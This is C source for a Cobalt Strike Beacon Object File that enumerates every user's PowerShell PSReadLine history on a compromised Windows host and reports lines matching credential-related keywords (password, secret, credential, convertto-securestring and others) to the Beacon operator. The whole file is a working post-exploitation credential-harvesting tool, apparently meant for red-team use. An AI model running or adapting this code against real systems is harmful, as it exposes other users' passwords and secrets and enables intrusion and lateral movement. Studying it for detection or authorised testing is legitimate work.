#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <string.h>

#include "enumpwshhist.h"

//START TrustedSec BOF print code: https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/src/common/base.c
#ifndef bufsize
#define bufsize 8192
#endif
char *output = 0;
WORD currentoutsize = 0;
HANDLE trash = NULL;
int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {
    output = (char*)MSVCRT$calloc(bufsize, 1);
    currentoutsize = 0;
    return 1;
}

void internal_printf(const char* format, ...){
    int buffersize = 0;
    int transfersize = 0;
    char * curloc = NULL;
    char* intBuffer = NULL;
    va_list args;
    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args);
    va_end(args);

    if (buffersize == -1) return;

    char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
	intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize, format, args);
    va_end(args);
    if(buffersize + currentoutsize < bufsize)
    {
        MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    } else {
        curloc = intBuffer;
        while(buffersize > 0)
        {
            transfersize = bufsize - currentoutsize;
            if(buffersize < transfersize)
            {
                transfersize = buffersize;
            }
            MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if(currentoutsize == bufsize)
            {
                printoutput(FALSE);
            }
            MSVCRT$memset(transferBuffer, 0, transfersize);
            curloc += transfersize;
            buffersize -= transfersize;
        }
    }
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
}

void printoutput(BOOL done) {
    char * msg = NULL;
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, bufsize);
    if(done) {MSVCRT$free(output); output=NULL;}
}
//END TrustedSec BOF print code.


void constructPath(char *buffer, size_t bufferSize, const char *format, ...) {
    va_list args;
    va_start(args, format);
    MSVCRT$vsnprintf(buffer, bufferSize, format, args);
    va_end(args);
}

// List of excluded directories
const char *excludedDirs[] = {
    ".", "..", "desktop.ini", "Public", "Default",
    "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"
};
const int excludedDirCount = sizeof(excludedDirs) / sizeof(excludedDirs[0]);

// List of sensitive keywords
const char *sensitiveKeywords[] = {
    "password", "passw", "secret", "credential", "key",
    "get-credential", "convertto-securestring", "set-localuser",
    "new-localuser", "set-adaccountpassword", "new-object system.net.webclient",
    "invoke-webrequest", "invoke-restmethod"
};
const int sensitiveKeywordCount = sizeof(sensitiveKeywords) / sizeof(sensitiveKeywords[0]);

// Check if a directory is excluded
int isExcluded(const char *dir) {
    for (int i = 0; i < excludedDirCount; i++) {
        if (MSVCRT$_stricmp(dir, excludedDirs[i]) == 0) {
            return 1; // Excluded
        }
    }
    return 0; // Not excluded
}

// Check if a file contains any sensitive keywords
int fileContainsSensitiveKeywords(const char *filePath) {
    FILE *file = MSVCRT$fopen(filePath, "r");
    if (!file) {
        internal_printf("Failed to open file: %s\n", filePath);
        return 0; // Could not open file
    }

    int sensitiveKeywordFound = 0;

    char line[1024];
    while (MSVCRT$fgets(line, sizeof(line), file)) {
	    // convert line to lowercase
	  for (int c = 0; c < sizeof(line); c++) line[c] = MSVCRT$tolower(line[c]);

        for (int i = 0; i < sensitiveKeywordCount; i++) {
            if (MSVCRT$strstr(line, sensitiveKeywords[i]) != NULL) {
                //internal_printf("\tSensitive keyword (%s) found in file: %s\n", sensitiveKeywords[i]);
                internal_printf("\t[%s]: %s\n", sensitiveKeywords[i], line);
                sensitiveKeywordFound = 1;
                continue;
            }
        }
    }

    MSVCRT$fclose(file);
    return sensitiveKeywordFound;
}

// List files in a directory and check for sensitive keywords
void listAndCheckFiles(const char *directory) {
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    char searchPath[MAX_PATH];
    char filePath[MAX_PATH];

    constructPath(searchPath, MAX_PATH, "%s\\*", directory);

    hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        internal_printf("Failed to list files in %s. Error: %d\n", directory, KERNEL32$GetLastError());
        return;
    }

    do {

	// disregard files / directories in excludedDir array
	if (isExcluded(findData.cFileName)) {
		continue;
	}

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        	internal_printf("\tDirectory found (this is weird... check manually): %s\n", findData.cFileName);
		continue;
	}
         
	    internal_printf("\tFile found: %s\n", findData.cFileName);
	
            constructPath(filePath, MAX_PATH, "%s\\%s", directory, findData.cFileName);
	    internal_printf("\tFull path: %s\n", filePath);

            fileContainsSensitiveKeywords(filePath);
        
    } while (KERNEL32$FindNextFileA(hFind, &findData) != 0);

    KERNEL32$FindClose(hFind);
}

int go() {
    if(!bofstart()) return 1;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Enumerating powershell history files!\n");

    WIN32_FIND_DATA findData;
    HANDLE hFind;
    const char *baseDir = "C:\\Users";
    char fullPath[MAX_PATH];
    char targetPath[MAX_PATH];

    constructPath(fullPath, MAX_PATH, "%s\\*", baseDir);

    hFind = KERNEL32$FindFirstFileA(fullPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to list directories in %s. Error: %d\n", baseDir, KERNEL32$GetLastError());
        return 1;
    }

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            const char *dirName = findData.cFileName;

            if (isExcluded(dirName)) {
                continue; // Skip excluded directories
            }

            // Construct the target subdirectory path
            constructPath(targetPath, MAX_PATH, "%s\\%s\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine", baseDir, dirName);

            internal_printf("Evaluating directory: %s\n", targetPath);
            // Check if the directory exists
            DWORD attributes = KERNEL32$GetFileAttributesA(targetPath);
            if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
                // Check the files in the directory
                listAndCheckFiles(targetPath);
            } else {
                internal_printf("\tDirectory '%s' does not exist.\n", targetPath);
            }
        }
    } while (KERNEL32$FindNextFileA(hFind, &findData) != 0);

    KERNEL32$FindClose(hFind);

    printoutput(TRUE);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Finished powershell file enumeration!\n");

    return 0;
}

